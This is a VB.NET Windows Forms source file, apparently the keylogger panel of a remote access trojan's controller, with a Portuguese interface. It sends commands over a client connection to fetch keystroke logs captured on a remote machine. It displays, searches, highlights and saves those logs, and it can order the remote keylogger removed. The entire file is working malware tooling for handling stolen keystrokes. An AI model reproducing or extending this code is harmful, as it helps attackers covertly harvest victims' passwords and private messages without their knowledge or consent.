Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class FrmKeylogger

    Public c As MdClient
    Private last As ListViewItem

    Public Sub insert(ByVal T As String)
        If (T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))) Then
            Me.RSLogs.SelectionFont = New Font(Me.RSLogs.Font, FontStyle.Bold)
            Me.RSLogs.SelectionColor = Color.SteelBlue
            Me.RSLogs.AppendText((ChrW(13) & ChrW(10) & "[ " & T.Replace(ChrW(1), "") & "]" & ChrW(13) & ChrW(10)))
        Else
            Me.RSLogs.SelectionFont = Me.RSLogs.Font
            Me.RSLogs.SelectionColor = Color.Yellow
            Me.RSLogs.AppendText((T & ChrW(13) & ChrW(10)))
        End If
    End Sub

    Private Sub btnAtualizar_Click(sender As Object, e As EventArgs) Handles btnAtualizar.Click
        Try
            Me.c.Send("kl")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Dim MICOLOR As Color
    Private Sub btnPesquisar_Click(sender As Object, e As EventArgs) Handles btnPesquisar.Click
        Dim TEMPORAL As String = RSLogs.Text
        RSLogs.Clear()
        RSLogs.Text = TEMPORAL
        RSLogs.ForeColor = Color.Blue
        Try
            Dim INDEX As Integer
            While INDEX < RSLogs.Text.LastIndexOf(txtPesquisar.Text)
                RSLogs.Find(txtPesquisar.Text, INDEX, RSLogs.TextLength, RichTextBoxFinds.None)
                RSLogs.SelectionBackColor = MICOLOR
                INDEX = RSLogs.Text.IndexOf(txtPesquisar.Text, INDEX) + 1
            End While
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub btnCores_Click(sender As Object, e As EventArgs) Handles btnCores.Click
        Dim ColorDialog1 As New ColorDialog
        ColorDialog1.FullOpen = True
        If ColorDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            MICOLOR = ColorDialog1.Color
            btnCores.BackColor = MICOLOR
        End If
    End Sub

    Private Sub FrmKeylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MICOLOR = Color.Yellow
    End Sub

    Private Sub btnSalvar_Click(sender As Object, e As EventArgs) Handles btnSalvar.Click
        Try
            Dim n As New SaveFileDialog
            n.Title = "SALVAR ARQUIVOS"
            n.Filter = "ARQUIVOS (*.txt)|*.txt|TODOS ARQUIVOS (*.*)|*.*"
            If n.ShowDialog = Windows.Forms.DialogResult.OK Then
                RSLogs.SaveFile(n.FileName, RichTextBoxStreamType.UnicodePlainText)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub btnExcluir_Click(sender As Object, e As EventArgs) Handles btnExcluir.Click
        Try
            If MessageBox.Show("DESEJA MESMO EXCLUIR O KEYLOGGER PERMANENTE ?", "Informações", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) = Windows.Forms.DialogResult.OK Then
                Me.c.Send("ExcluirKeyllogger")
                RSLogs.Clear()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub
End Class